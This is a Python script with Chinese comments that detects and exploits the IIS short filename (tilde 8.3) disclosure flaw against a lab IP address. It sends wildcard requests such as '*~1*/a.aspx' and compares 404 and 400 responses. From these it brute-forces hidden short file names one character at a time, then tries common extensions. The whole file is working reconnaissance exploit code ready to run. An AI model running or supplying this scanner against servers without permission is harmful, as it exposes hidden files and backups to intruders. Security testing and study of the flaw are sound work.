import requests
import string


def check_short_filename(url):#检查是否存在
    try:
        check_payload_404 = "*~1*/clown.aspx"#一个通用存在的情况
        check_url_404 = url+check_payload_404
        re_404 = requests.get(check_url_404)

        check_payload_400 = "*~999.clown/clown.aspx"#一个几乎不可能存在的情况
        check_url_400 = url+check_payload_400
        re_400 = requests.get(check_url_400)
        if f'404' in str(re_404) and f'400' in str(re_400):
            print("目标疑似存在短文件漏洞")
            return True
        print("目标未检测到短文件漏洞")
        return False
    except Exception as e:
        print("发生错误:", e)

def scan_snort_filename(url,found_filenames,new_set):
    try:
        stringlist = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
        filenames = [""]

        while filenames:
            new_filenames = []
            for filename in filenames:
                for i in stringlist:
                    payload = url + filename + i + "*~1*/a.aspx"
                    if f'404' in str(requests.get(payload)):
                        new_filename = filename + i
                        new_filenames.append(new_filename)
                        found_filenames.add(new_filename)
            filenames = new_filenames

        for filename in found_filenames:
            if len(filename) == 6:
                new_set.add(filename)
                # print(filename + "~1")

    except Exception as e:
        print("发生错误:", e)


def scan_snort_suffix(url, found_filenames):
    try:
        common_suffixes = [".htm", ".html", ".php", ".asp", ".aspx", ".jsp", ".cgi", ".pl",
                           ".css", ".js", ".txt", ".xml", ".json", ".csv", ".doc", ".docx",
                           ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".tar",
                           ".gz", ".7z", ".bmp", ".jpg", ".jpeg", ".png", ".gif", ".ico"]
        found_suffixs = set()

        for filename in found_filenames:
            found = False
            for suffix in common_suffixes:
                payload = url + filename + "~1" + suffix + "*/a.aspx"
                # print(payload)
                if f'404' in str(requests.get(payload)):
                    found = True
                    found_suffixs.add(filename + "~1" + suffix)
            if not found:
                found_suffixs.add(filename)

        for suffix in found_suffixs:
            print(suffix)

    except Exception as e:
        print("发生错误:", e)


if __name__ == "__main__":
    # 指定要探测的URL
    target_url = "http://192.168.246.129/"  # 替换为你要探测的URL
    # 调用函数进行探测
    result = check_short_filename(target_url)
    if (result):
        found_filenames = set()
        new_filenames = set()
        scan_snort_filename(target_url,found_filenames,new_filenames)
        scan_snort_suffix(target_url,new_filenames)
